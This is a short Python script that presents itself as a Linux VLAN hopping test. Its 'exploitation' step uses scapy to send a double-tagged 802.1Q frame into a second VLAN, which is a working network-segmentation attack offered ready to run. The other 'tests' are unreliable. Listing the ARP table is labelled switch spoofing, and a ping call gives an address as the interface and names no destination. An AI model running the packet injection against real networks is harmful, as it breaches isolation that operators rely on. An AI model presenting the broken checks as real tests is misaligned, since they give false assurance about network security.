#########################################################################################################################################################################################################################
# Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the “Software”), to deal in the Software 
# without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons 
# to whom the Software is furnished to do so, subject to the following conditions: The above copyright notice and this permission notice shall be included in all copies or substantial 
# portions of the Software.
# THE SOFTWARE IS PROVIDED “AS IS”, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE 
# AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, 
# WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
#########################################################################################################################################################################################################################

import os
import subprocess

def vlan_hopping_test_linux(vlan_id1, vlan_id2):
    print("Running VLAN hopping test on Linux...")

    # Switch Spoofing Test
    print("Switch Spoofing Test:")
    subprocess.run(['arp', '-a'])

    # Double Tagging Test
    print(f"Double Tagging Test (VLAN {vlan_id1} -> VLAN {vlan_id2}):")
    subprocess.run(['ping', '-I', f'192.168.{vlan_id1}.1', '-c', '4'])

    # Exploitation (with permission)
    print("Exploitation Example:")
    from scapy.all import *
    pkt = Ether()/Dot1Q(vlan=vlan_id1)/Dot1Q(vlan=vlan_id2)/IP(dst=f"192.168.{vlan_id2}.1")/ICMP()
    sendp(pkt, iface="eth0")
    print("Exploitation packet sent")

if __name__ == "__main__":
    vlan_id1 = 10  # Replace with your VLAN ID 1
    vlan_id2 = 20  # Replace with your VLAN ID 2
    vlan_hopping_test_linux(vlan_id1, vlan_id2)

